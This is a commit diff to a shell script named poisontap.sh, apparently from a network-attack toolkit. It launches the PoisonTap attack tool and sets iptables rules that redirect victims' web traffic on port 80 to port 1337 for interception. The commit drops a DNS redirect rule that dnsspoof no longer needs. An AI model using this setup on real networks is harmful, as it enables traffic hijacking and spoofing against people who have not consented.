20011d4207107529210b65799eceed4a467753aa
s0i37 <s0i37@work>
2021-03-30 22:50:36 +0500

    disabling netfilter for dnsspoof, because it doesnt need

--- on_network/poisontap.sh
+++ on_network/poisontap.sh
@@ -13,10 +13,6 @@ sleep 5 # after captive portal checks
   screen -dmS poisontap nodejs $HOME/src/poisontap/pi_poisontap.js
 }
 
-[[ $(iptables -t nat -vnL PREROUTING | grep "$1" | grep 53) = '' ]] && {
-  iptables -t nat -A PREROUTING -i "$1" -p udp --dport 53 -j REDIRECT --to-port 53
-}
-
 [[ $(iptables -t nat -vnL PREROUTING | grep "$1" | grep 1337) = '' ]] && {
   iptables -t nat -A PREROUTING -i "$1" -p tcp --dport 80 -j REDIRECT --to-port 1337
 }
